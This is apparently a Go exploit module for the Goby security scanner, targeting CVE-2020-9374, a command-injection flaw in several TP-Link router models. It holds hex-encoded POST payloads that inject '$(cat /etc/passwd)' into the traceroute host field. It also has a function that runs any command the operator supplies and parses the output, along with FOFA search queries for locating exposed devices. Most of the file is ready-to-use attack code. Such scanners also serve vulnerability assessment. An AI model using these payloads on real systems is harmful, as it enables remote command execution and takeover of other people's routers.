package exploits

import (
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Command Execution in Multiple TP-LINK Routers (CVE-2020-9374)",
    "Description": "<p>Multiple models of TP-Link routers from TP-Link Technologies Co., Ltd., including TL-WR841N, TL-WR840N, Archer C20, TL-WR849N, Archer C55, Archer C50, TL-WA801ND, TL-WR841HP, TL-WR845N, Archer C20i, Archer C2, are vulnerable to a command execution flaw. Attackers can exploit this vulnerability to execute arbitrary code, inject backdoors, gain server privileges, and ultimately take control of the entire web server.</p>",
    "Product": "TP_LINK-TL-WR849N",
    "Homepage": "https://www.tp-link.com.cn/",
    "DisclosureDate": "2020-02-24",
    "Author": "460761114@qq.com",
    "FofaQuery": "body=\"tplinkwifi.net\" && body=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"",
    "GobyQuery": "body=\"tplinkwifi.net\" && body=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"",
    "Level": "3",
    "Impact": "<p>An attacker can exploit this vulnerability by sending shell metacharacters through the routing trace feature of the dashboard, allowing them to execute arbitrary commands, inject backdoors, gain server privileges, and ultimately take control of the entire web server.</p>",
    "Recommendation": "<p>1. The vendor has not yet released any official fixes to address this security issue. It is recommended that users of this software regularly monitor the vendor's website or refer to the provided URL for updates and solutions: <a href=\"https://www.tp-link.com/\">https://www.tp-link.com/</a></p><p>2. Implement access policies, such as using firewalls or other security devices, to set up whitelist-based access control.</p><p>3. Unless absolutely necessary, it is advised to restrict public internet access to the affected system.</p>",
    "References": [
        "https://www.exploit-db.com/exploits/48155"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi?2",
                "follow_redirect": false,
                "header": {
                    "Cookie": "Authorization=Basic REPLACEBASE64AUTH",
                    "Referer": "http://{{{hostinfo}}}/mainFrame.htm"
                },
                "data_type": "hexstring",
                "data": "5b5452414345524f5554455f4449414723302c302c302c302c302c3023302c302c302c302c302c305d302c380d0a6d6178486f70436f756e743d32300d0a74696d656f75743d350d0a6e756d6265724f6654726965733d310d0a686f73743d222428636174202f6574632f70617373776429220d0a64617461426c6f636b53697a653d36340d0a585f54505f436f6e6e4e616d653d6577616e5f7070706f650d0a646961676e6f737469637353746174653d5265717565737465640d0a585f54505f486f705365713d300d0a0d0a"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi?7",
                "follow_redirect": false,
                "header": {
                    "Cookie": "Authorization=Basic REPLACEBASE64AUTH",
                    "Referer": "http://{{{hostinfo}}}/mainFrame.htm"
                },
                "data_type": "hexstring",
                "data": "5b4143545f4f505f5452414345525423302c302c302c302c302c3023302c302c302c302c302c305d302c300d0a0d0a"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi?1",
                "follow_redirect": false,
                "header": {
                    "Referer": "http://{{{hostinfo}}}/mainFrame.htm",
                    "Cookie": "Authorization=Basic REPLACEBASE64AUTH"
                },
                "data_type": "hexstring",
                "data": "5b5452414345524f5554455f4449414723302c302c302c302c302c3023302c302c302c302c302c305d302c330d0a646961676e6f737469637353746174650d0a585f54505f486f705365710d0a585f54505f526573756c740d0a0d0a"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "X_TP_Result=admin:(.*?):/bin/\\w*sh",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2020-9374"
    ],
    "CNNVD": [
        "CNNVD-202002-1132"
    ],
    "CNVD": [
        "CNVD-2020-13890"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "TP_LINK 多款路由器命令执行（CVE-2020-9374）",
            "Product": "TP_LINK-TL-WR849N",
            "Description": "<p>中国普联（TP-Link）公司的多款路由器多个型号存在命令执行漏洞，其中包括TL-WR841N，TL-WR840N，Archer C20，TL-WR849N，Archer C55，Archer C50，TL-WA801ND，TL-WR841HP，TL-WR845N，Archer C20i，Archer C2等型号，攻击者可利用该漏洞任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://www.tp-link.com/\" target=\"_blank\">https://www.tp-link.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过向仪表盘的路由跟踪功能发送shell元字符利用该漏洞执行任意命令，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Command Execution in Multiple TP-LINK Routers (CVE-2020-9374)",
            "Product": "TP_LINK-TL-WR849N",
            "Description": "<p>Multiple models of TP-Link routers from TP-Link Technologies Co., Ltd., including TL-WR841N, TL-WR840N, Archer C20, TL-WR849N, Archer C55, Archer C50, TL-WA801ND, TL-WR841HP, TL-WR845N, Archer C20i, Archer C2, are vulnerable to a command execution flaw. Attackers can exploit this vulnerability to execute arbitrary code, inject backdoors, gain server privileges, and ultimately take control of the entire web server.</p>",
            "Recommendation": "<p>1. The vendor has not yet released any official fixes to address this security issue. It is recommended that users of this software regularly monitor the vendor's website or refer to the provided URL for updates and solutions: <a href=\"https://www.tp-link.com/\" target=\"_blank\">https://www.tp-link.com/</a></p><p>2. Implement access policies, such as using firewalls or other security devices, to set up whitelist-based access control.</p><p>3. Unless absolutely necessary, it is advised to restrict public internet access to the affected system.</p>",
            "Impact": "<p>An attacker can exploit this vulnerability by sending shell metacharacters through the routing trace feature of the dashboard, allowing them to execute arbitrary commands, inject backdoors, gain server privileges, and ultimately take control of the entire web server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10785"
}`

	sendPayloadFlagUMuUbu := func(u *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/cgi?2")
		cfg.VerifyTls = false
		data, _ := hex.DecodeString(strings.ReplaceAll("5b5452414345524f5554455f4449414723302c302c302c302c302c3023302c302c302c302c302c305d302c380d0a6d6178486f70436f756e743d32300d0a74696d656f75743d350d0a6e756d6265724f6654726965733d310d0a686f73743d222428636174202f6574632f70617373776429220d0a64617461426c6f636b53697a653d36340d0a585f54505f436f6e6e4e616d653d6577616e5f7070706f650d0a646961676e6f737469637353746174653d5265717565737465640d0a585f54505f486f705365713d300d0a0d0a", "636174202f6574632f706173737764", goutils.ToHex(cmd, 0)))
		cfg.Data = string(data)
		// inject
		cfg.Header.Store("Referer", u.FixedHostInfo+"/mainFrame.htm")
		cfg.Header.Store("Cookie", "Authorization=Basic REPLACEBASE64AUTH")
		rsp, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return rsp, err
		} else if rsp.StatusCode != 200 && !strings.Contains(rsp.Utf8Html, "error") {
			return nil, errors.New("漏洞不存在")
		}
		// aceppt
		cfg.URI = "/cgi?7"
		data, _ = hex.DecodeString("5b4143545f4f505f5452414345525423302c302c302c302c302c3023302c302c302c302c302c305d302c300d0a0d0a")
		cfg.Data = string(data)
		rsp, err = httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return rsp, err
		} else if rsp.StatusCode != 200 && !strings.Contains(rsp.Utf8Html, "error") {
			return nil, errors.New("漏洞不存在")
		}
		// output
		cfg.URI = "/cgi?1"
		data, _ = hex.DecodeString("5b5452414345524f5554455f4449414723302c302c302c302c302c3023302c302c302c302c302c305d302c330d0a646961676e6f737469637353746174650d0a585f54505f486f705365710d0a585f54505f526573756c740d0a0d0a")
		cfg.Data = string(data)
		rsp, err = httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return rsp, err
		} else if strings.Contains(rsp.Utf8Html, "X_TP_Result=") {
			return rsp, err
		} else {
			return nil, errors.New("漏洞不存在")
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloadFlagUMuUbu(u, "echo d6d3aa58728fcaca887a90e3aa138f39")
			if err != nil {
				return false
			} else {
				return strings.Contains(rsp.Utf8Html, "d6d3aa58728fcaca887a90e3aa138f39")
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				rsp, err := sendPayloadFlagUMuUbu(expResult.HostInfo, goutils.B2S(ss.Params["cmd"]))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else {
					expResult.Success = true
					output := strings.ReplaceAll(rsp.Utf8Html, ": Name or service not known", "")
					output = strings.ReplaceAll(output, "[0,0,0,0,0,0]0", "")
					output = strings.ReplaceAll(output, "diagnosticsState=", "")
					output = strings.ReplaceAll(output, "X_TP_HopSeq=0", "")
					output = strings.ReplaceAll(output, "Error_CannotResolveHostName", "")
					reg, _ := regexp.Compile(`X_TP_Result=[\s\S]+\[error\]`)
					if len(reg.FindStringSubmatch(output)) > 0 {
						output = reg.FindStringSubmatch(output)[0]
						output = strings.ReplaceAll(output, "X_TP_Result=", "")
						output = strings.ReplaceAll(output, "[error]", "")
					}
					expResult.Output = output
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
